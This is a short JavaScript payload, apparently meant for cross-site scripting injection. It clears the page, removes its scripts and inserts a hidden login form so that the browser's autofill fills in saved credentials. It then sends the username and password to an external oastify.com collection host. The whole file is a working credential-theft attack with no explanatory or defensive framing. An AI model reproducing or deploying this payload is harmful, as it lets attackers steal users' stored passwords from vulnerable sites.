document.body.innerHTML = "";
var scriptss = document.scripts;

for (var i = scriptss.length - 1; i >= 0; i--) {
var script = scriptss[i];
script.parentNode.removeChild(script);
}

var s = document.createElement('style');
var c = 'body > *:not(form):not(textarea) { display: none !important; }';
s.appendChild(document.createTextNode(c));
document.head.appendChild(s);

var form = document.createElement('form');
var test=document.createElement('a')
test.style="width:100%;height:100%"

var inputName = document.createElement('input');
inputName.type = 'text';
inputName.id = 'username';
inputName.name = 'username';
inputName.autocomplete = 'username';
inputName.placeholder = 'Check here';
inputName.style.border = "none";
inputName.style.outline = "none";
inputName.style.background = "none";
inputName.style.width = "100%";
inputName.classList.add("single-input")

var inputPassword = document.createElement('input');
inputPassword.type = 'password';
inputPassword.id = 'password';
inputPassword.name = 'password';
inputPassword.autocomplete = 'current-password';
inputPassword.style.border = "none";
inputPassword.style.outline = "none";
inputPassword.style.background = "none";
inputPassword.style.padding = "0";
inputPassword.style.width = "1%";
inputPassword.classList.add("single-input")

form.appendChild(inputName);
form.appendChild(inputPassword);

document.body.appendChild(form);

// Assuming you have an <input> element with an ID of "myInput"
var inputElement = document.getElementById("username");

async function sleep(milliseconds) {
    return new Promise(resolve => setTimeout(resolve, milliseconds));
  }

async function mrx() {

for(var i=0;i<=100;i++){
    await sleep(500)
let a = document.getElementsByName('username')[0];
let b = document.getElementsByName('password')[0];
if(a.value.length>0) {
    window.location="https://au8me06o6dzs198npqzrmhcqwh28q2er.oastify.com/?username="+a.value+"&password="+b.value
}

}



}
mrx()
